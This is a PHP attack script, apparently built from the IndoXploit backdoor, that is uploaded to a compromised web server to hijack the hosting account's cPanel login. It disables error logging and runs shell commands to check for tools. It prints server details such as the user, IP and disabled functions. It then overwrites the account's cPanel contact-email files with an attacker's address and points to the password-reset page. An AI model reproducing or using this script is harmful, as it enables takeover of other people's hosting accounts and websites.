  <?php
  //thanks to : IndoXploit (Shell  Backdoor) - Garuda Tersakti 72 ( My Team )
  session_start();
  @error_reporting(0);
  @set_time_limit(0);
  if(version_compare(PHP_VERSION, '5.3.0', '<')) {
  	@set_magic_quotes_runtime(0);
  }
  @clearstatcache();
  @ini_set('error_log',NULL);
  @ini_set('log_errors',0);
  @ini_set('max_execution_time',0);
  @ini_set('output_buffering',0);
  @ini_set('display_errors', 0);
  $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];

  function background() {
    echo '<body bgcolor=black>';
  }
  function color($bold = 1, $colorid = null, $string = null) {
  		$color = array(
  			"</font>",  			# 0 off
  			"<font color='red'>",	# 1 red
  			"<font color='lime'>",	# 2 lime
  			"<font color='lime'>",	# 3 white
  			"<font color='gold'>",	# 4 gold
  		);
  	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
  }
  function hddsize($size) {
  	if($size >= 1073741824)
  		return sprintf('%1.2f',$size / 1073741824 ).' GB';
  	elseif($size >= 1048576)
  		return sprintf('%1.2f',$size / 1048576 ) .' MB';
  	elseif($size >= 1024)
  		return sprintf('%1.2f',$size / 1024 ) .' KB';
  	else
  		return $size .' B';
  }
  function hdd() {
  	$hdd['size'] = hddsize(disk_total_space("/"));
  	$hdd['free'] = hddsize(disk_free_space("/"));
  	$hdd['used'] = $hdd['size'] - $hdd['free'];
  	return (object) $hdd;
  }
  function usergroup() {
  	if(!function_exists('posix_getegid')) {
  		$user['name'] 	= @get_current_user();
  		$user['uid']  	= @getmyuid();
  		$user['gid']  	= @getmygid();
  		$user['group']	= "?";
  	} else {
  		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
  		$user['gid'] 	= @posix_getgrgid(posix_getegid());
  		$user['name'] 	= $user['uid']['name'];
  		$user['uid'] 	= $user['uid']['uid'];
  		$user['group'] 	= $user['gid']['name'];
  		$user['gid'] 	= $user['gid']['gid'];
  	}
  	return (object) $user;
  }
  function lib_installed() {
  	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
  	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
  	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
  	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
  	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
  	return implode(" | ", $lib);
  }
  function exe($cmd) {
  	if(function_exists('system')) {
  		@ob_start();
  		@system($cmd);
  		$buff = @ob_get_contents();
  		@ob_end_clean();
  		return $buff;
  	} elseif(function_exists('exec')) {
  		@exec($cmd,$results);
  		$buff = "";
  		foreach($results as $result) {
  			$buff .= $result;
  		} return $buff;
  	} elseif(function_exists('passthru')) {
  		@ob_start();
  		@passthru($cmd);
  		$buff = @ob_get_contents();
  		@ob_end_clean();
  		return $buff;
  	} elseif(function_exists('shell_exec')) {
  		$buff = @shell_exec($cmd);
  		return $buff;
  	}
  }

  function infosistem() {
    $disable_functions = @ini_get('disable_functions');
  	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
    $output[] = "<body bgcolor=gray><center> <font size=5 color=lime>[X] Reset Password Cpanel [X]</font> </center> <br>";
    $output[] = "<hr color='lime'> Domain : " .color(1, 2,$_SERVER[HTTP_HOST]) . " | Cpanel Login : <font color=lime>http://" . $_SERVER[HTTP_HOST] . "/cpanel </font>" . "<hr color='lime'>";
    $output[] = "PHP VERSION : " .color(1, 2,phpversion());
    $output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
    $output[] = "SYSTEM      : ".color(1, 2, php_uname());
    $output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
    $output[] = "SERVER IP   : ".color(1, 2, $GLOBALS['SERVERIP'])." <br>YOUR IP     : ".color(1, 2, $_SERVER['REMOTE_ADDR']);
    $output[] = "DISABLE FUNC: $disable_functions";
    $output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
    $output[] = "<hr color='lime'>" . lib_installed() . "<hr color='lime'>";
    print "<font color=gray><pre>";
  	print implode("<br>", $output);
  	print "</pre></font>";
  }

  background();
  infosistem();
  ############################
  ##Script Resetpass Cpanel ##
  ##Coded By Naufal Ardhani ##
  ## www.naufalardhani.com  ##
  ############################

  echo '<html>
      <head>
      <link rel="shortcut icon" href="https://cdn.kualo.com/website/icon_cpanel.png">

  	      <title>Reset Password Cpanel  </title>
  	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <body bgcolor=gray>
  </body>
  <style type="text/css">body, a:hover {cursor: url(), url(http://cur.cursors-4u.net/games/gam-15/gam1440.gif), progress !important;}</style><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Toad Jumping Up and Down" style="position:absolute; top: 0px; right: 0px;" /></a></style>
  <style>
  input[type="email"] {
    border: 1px solid #ddd;
    padding: 4px 8px;
  }

  input[type="email"]:focus {
    border: 1px solid #000;
  }

  input[type="submit"] {
    font-weight: bold;
    padding: 4px 8px;
    border:2px solid lime;
    background: lime;
    color:#fff;
  }
  </style>
        	</head>
       <body>
  	 <!--SCC -->
         <center>
         <br><br>
         <font color="lime" size="5"><pre><b>Masukkan Email!</b></pre></font>
  	   <div style="border: 4px solid lime;padding: 4px 2px;width: 25%;line-height: 24px;background: black;color:lime;">
  	   <br>
  	<p>
  	    <form action="#" method="post">
  	    <b> Email : </b>
  	<input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:lime;" />
  	<input type="submit" name="submit" value="Send" style="style="border-radius: 6px;font: 9pt tahoma;color:lime;"/>

  	</form>
  	<br>
  	</p>
  	</div>
  	<br>
  	<font color="lime" size="5"><b><pre>Coded by Naufal Ardhani | Blog : <a href="https://naufalardhani.com">www.Naufalrdhani.com</a> </font></b></pre>
    <hr color="lime">
    <font color="lime" size="5"><pre> Thanks to :  <a href="https://www.garudatersakti72.id/">Garuda Tersakti 72</a>   - IndoXploit </pre></font>
     </center>
      </body>
  </html>';

  echo "<font color=lime>";
  $user = get_current_user();
  $site = $_SERVER['HTTP_HOST'];
  $ips = getenv('REMOTE_ADDR');

  if(isset($_POST['submit'])){

  	$email = $_POST['email'];
  	$wr = 'email:'.$email;
  $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
  fwrite($f, $wr);
  fclose($f);
  $f = fopen('/home/'.$user.'/.contactinfo', 'w');
  fwrite($f, $wr);
  fclose($f);
  $parm = "Disini : " . $site.':2083/resetpass?start=1';
  echo '<br/><center>'.$parm.'</center>';
  }
